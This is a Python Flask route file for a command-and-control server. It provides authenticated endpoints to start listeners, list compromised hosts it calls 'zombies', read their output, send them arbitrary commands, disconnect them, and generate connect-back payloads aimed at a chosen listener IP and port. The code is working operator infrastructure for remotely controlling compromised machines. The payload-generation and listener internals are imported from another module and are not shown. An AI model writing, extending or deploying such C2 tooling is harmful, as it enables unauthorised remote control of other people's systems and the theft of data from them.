from flask import Blueprint, jsonify, request, session
import re
from handlers.c2_listener import (
    start_listener, stop_listener, stop_all_listeners,
    get_listeners, get_zombies, get_zombie_output,
    send_command, disconnect_zombie, generate_payload, _validate_ip, _validate_port
)

c2_bp = Blueprint('c2_routes', __name__)


from core.auth import login_required
from core.validation import bounded_integer

# FIX: Optional rate-limit decorator for sensitive C2 endpoints
try:
    from core.extensions import limiter
    def rate_limit(limit_str):
        """Decorator that applies a rate limit only when flask-limiter is available."""
        def decorator(f):
            if limiter:
                return limiter.limit(limit_str)(f)
            return f
        return decorator
except ImportError:
    def rate_limit(limit_str):
        return lambda f: f


@c2_bp.route('/api/c2/listeners', methods=['GET'])
@login_required
def api_get_listeners():
    return jsonify(get_listeners())


@c2_bp.route('/api/c2/listener/start', methods=['POST'])
@login_required
@rate_limit("10 per minute")
def api_start_listener():
    data = request.get_json()
    port = bounded_integer(data.get('port', 4444), 'port', minimum=1, maximum=65535, default=4444)

    bind_addr = data.get('bind_addr', '0.0.0.0')
    # FIX: Validate IP/bind address format
    if bind_addr != '0.0.0.0' and not _validate_ip(bind_addr):
        return jsonify({"status": "error", "message": f"Invalid bind address: {bind_addr}"})

    name = str(data.get('name', 'Default Listener'))[:50]  # FIX: limit name length
    result = start_listener(port, bind_addr, name)
    return jsonify(result)


@c2_bp.route('/api/c2/listener/stop', methods=['POST'])
@login_required
def api_stop_listener():
    data = request.get_json()
    listener_id = data.get('listener_id', '')
    if not listener_id:
        return jsonify({"status": "error", "message": "listener_id required."})
    result = stop_listener(listener_id)
    return jsonify(result)


@c2_bp.route('/api/c2/listener/stop_all', methods=['POST'])
@login_required
def api_stop_all_listeners():
    result = stop_all_listeners()
    return jsonify(result)


@c2_bp.route('/api/c2/zombies', methods=['GET'])
@login_required
def api_get_zombies():
    listener_id = request.args.get('listener_id', None)
    result = get_zombies(listener_id)
    return jsonify(result)


@c2_bp.route('/api/c2/zombie/output', methods=['GET'])
@login_required
def api_get_zombie_output():
    zombie_id = request.args.get('zombie_id', '')
    since = bounded_integer(request.args.get('since', 0), 'since', minimum=0, maximum=999999, default=0)
    if not zombie_id:
        return jsonify({"status": "error", "message": "zombie_id required."})
    result = get_zombie_output(zombie_id, since)
    return jsonify(result)


@c2_bp.route('/api/c2/zombie/command', methods=['POST'])
@login_required
def api_send_command():
    data = request.get_json()
    zombie_id = data.get('zombie_id', '')
    command = data.get('command', '')
    if not zombie_id or not command:
        return jsonify({"status": "error", "message": "zombie_id and command required."})
    result = send_command(zombie_id, command)
    return jsonify(result)


@c2_bp.route('/api/c2/zombie/disconnect', methods=['POST'])
@login_required
def api_disconnect_zombie():
    data = request.get_json()
    zombie_id = data.get('zombie_id', '')
    if not zombie_id:
        return jsonify({"status": "error", "message": "zombie_id required."})
    result = disconnect_zombie(zombie_id)
    return jsonify(result)


@c2_bp.route('/api/c2/payload/generate', methods=['POST'])
@login_required
@rate_limit("20 per minute")
def api_generate_payload():
    data = request.get_json()
    listener_ip = data.get('listener_ip', '')
    listener_port = data.get('listener_port', 4444)
    payload_type = data.get('payload_type', 'python')
    if not listener_ip:
        return jsonify({"status": "error", "message": "listener_ip required."})
    result = generate_payload(listener_ip, listener_port, payload_type)
    return jsonify(result)
